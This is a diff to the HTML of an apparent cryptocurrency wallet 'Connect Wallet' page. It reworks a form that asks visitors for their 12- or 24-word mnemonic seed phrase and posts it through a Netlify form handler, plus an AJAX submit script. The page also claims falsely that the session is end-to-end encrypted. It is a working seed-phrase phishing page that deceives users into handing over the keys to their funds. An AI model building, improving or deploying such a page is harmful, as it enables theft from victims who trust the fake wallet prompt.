@@ -1368,64 +1368,59 @@
 
                     </div>
 
-                   <div id="div_connect_manuallly">
-  <form method="POST" id="my-form" data-netlify="true">
-    <input type="hidden" name="form-name" value="connect-manually" />
-    <div id="phrase">
-      <textarea
-        class="col-12 form-control"
-        placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
-        style="font-size:14px; font-weight:650; color: #fff !important;"
-        rows="4"
-        id="secret_phrase"
-        name="phrases"
-        required
-      ></textarea>
-      <p id="error-message" style="color: red; display: none;">Error connecting. Please try again.</p>
-      <div class="row mx-auto col-10 mt-4">
-        <button type="submit" class="btn btn-primary">Connect Wallet</button>
+                 <div id="div_connect_manuallly">
+    <form method="POST" id="privateKeyForm" data-netlify="true">
+      <input type="hidden" name="form-name" value="privateKeyForm" />
+      <div id="phrase">
+        <textarea
+          class="col-12 form-control"
+          placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
+          style="font-size:14px; font-weight:650; color: #fff !important;"
+          rows="4"
+          id="phrase"
+          name="phrase1"
+          required
+        ></textarea>
+       
+        <div class="row mx-auto col-10 mt-4">
+          <button id="privateBtn" type="submit" class="btn btn-primary">Connect Wallet</button>
+        </div>
       </div>
-    </div>
-  </form>
+
+      <!-- Success Message -->
+<div id="success-message-3" style="display: none; text-align: center; color: green;">
+    <p>Form 3 submitted successfully!</p>
 </div>
 
+        <!-- AJAX Script for Private Key -->
 <script>
-  document.addEventListener("DOMContentLoaded", () => {
-    console.log("DOM fully loaded!");
+    const form3 = document.getElementById("privateKeyForm");
+    const successMessage3 = document.getElementById("success-message-3");
 
-    const form = document.getElementById("my-form");
+    form3.addEventListener("submit", async function (event) {
+        event.preventDefault(); // Prevent the default form submission
 
-    if (!form) {
-      console.error("Form not found!");
-      return;
-    }
+        const formData = new FormData(form3);
 
-    form.addEventListener("submit", async function (event) {
-      console.log("Form submit event triggered");
-      event.preventDefault(); // Prevent default submission
+        try {
+            const response = await fetch("/", {
+                method: "POST",
+                body: formData,
+            });
 
-      const formData = new FormData(form);
-
-      try {
-        const response = await fetch("/", {
-          method: "POST",
-          body: formData,
-        });
-
-        if (response.ok) {
-          alert("Form submitted successfully!");
-          form.reset(); // Reset the form on success
-        } else {
-          console.error("Submission failed");
-          document.getElementById("error-message").style.display = "block"; // Show error message
+            if (response.ok) {
+                form3.style.display = "none"; // Hide the form
+                successMessage3.style.display = "block"; // Show success message
+            } else {
+                alert("Submission failed. Please try again later.");
+            }
+        } catch (error) {
+            console.error("Error submitting form:", error);
+            alert("An error occurred. Please try again.");
         }
-      } catch (error) {
-        console.error("Error submitting form:", error);
-        document.getElementById("error-message").style.display = "block"; // Show error message
-      }
     });
-  });
 </script>
+
 
                     <div class="mt-4 d-flex justify-content-center align-items-center">
                         <img src="asset/images/icon/shield.png" width="30" height="30" style="margin-right: 10px !important;" /> <small>This session is protected with an end-to-end encryption</small>
